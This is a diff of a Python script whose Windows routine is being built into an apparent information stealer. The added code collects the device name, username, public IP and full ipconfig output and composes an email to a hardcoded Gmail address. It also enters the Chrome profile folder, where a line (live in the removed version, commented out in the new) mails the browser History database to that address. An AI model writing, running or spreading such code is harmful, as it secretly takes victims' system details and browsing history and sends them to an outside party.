@@ -13,56 +13,62 @@ from email.message import EmailMessage
 print('hi')
 def main(platform):
     def windows():
-        
+        p = subprocess.Popen("whoami", stdout=subprocess.PIPE, shell=True)
+
+        (whoami, err) = p.communicate()
+
+        p_status = p.wait()
+
+        whoami = str(whoami)
+        print(whoami)
+        whoami = whoami.replace('\\n', '\n')
+        whoami = whoami.replace('\\r', '')
+        whoami = whoami.replace("b'", '')
+        whoami = whoami.replace("'", '')
+        print(whoami)
+        w1 = whoami.find('\\')
+        username = (whoami[w1::]).replace('\\','')
+        device = whoami[:w1]
+        print(w1)
+        info = f'Windows device info from Device name: {device} and username: {username}'
+        print(info)
+#--------------------------------------------------------------------------------------
+
         p = subprocess.Popen("nslookup myip.opendns.com resolver1.opendns.com", stdout=subprocess.PIPE, shell=True)
 
-        (output, err) = p.communicate()
+        (pubip, err) = p.communicate()
 
         p_status = p.wait()
         
+#---------------------------------------------------------------------------------------
 
         p = subprocess.Popen("ipconfig/all", stdout=subprocess.PIPE, shell=True)
 
-        (output2, err) = p.communicate()
+        (allip, err) = p.communicate()
 
         p_status1 = p.wait()
-        output = f'\n{output}\n.\n.\n.\n.\n.\n.{output2}'
-        output = f'{output}'
-        output = output.replace('\\n', '\n')
-        output = output.replace('\\r', '')
-        output = output.replace("b'", '')
-        output = output.replace("'", '')
+        message = f"{info} \n \nPublic ip: {pubip}\n.\n.\n.\n.\n.\nAll ip info:\n{allip}"
+        message = f'{message}'
+        message = message.replace('\\n', '\n')
+        message = message.replace('\\r', '')
+        message = message.replace("b'", '')
+        message = message.replace("'", '')
 
         #print (output)
         #print (f'{p_status} {p_status}')
+#--------------------------------------------------------------------------------------------
 
+        try:
+            os.chdir(f"%APPDATA%\\Local\\Google\\Chrome\\User Data\\Default")
+            #os.system(f"uuencode History Profile{i}History.db | mail -s 'Chrome Mine for Profile {i} from {whoami}' SVBBZGRy@gmail.com")
+        except:
+            pass
+               
 
-        for i in f:
-            try:
-                os.chdir(f"%APPDATA%\Local\Google\Chrome\User Data\Default")
-                os.system(f"uuencode History Profile{i}History.db | mail -s 'Chrome Mine for Profile {i} from {whoami}' SVBBZGRy@gmail.com")
-            except:
-                pass
-        
-        #smtp_server = "smtp.gmail.com"
-        #sender_email = "SVBBZGRy@gmail.com"  # Enter your address
-        #receiver_email = "SVBBZGRy@gmail.com"  # Enter receiver address
-        #password = 'SVBBZGRy'
-
-        #subject = 'test'
-        
-        
-        message = f'{output}\n{p_status} {p_status}'
-        p = subprocess.Popen("whoami", stdout=subprocess.PIPE, shell=True)
-
-        (output3, err) = p.communicate()
-        print (output3)
-        
-        #context = ssl.create_default_context()
         msg = EmailMessage()
         msg.set_content(message)
 
-        msg['Subject'] = f'{whoami}'
+        msg['Subject'] = info
         msg['From'] = "SVBBZGRy@gmail.com"
         msg['To'] = "SVBBZGRy@gmail.com"
 
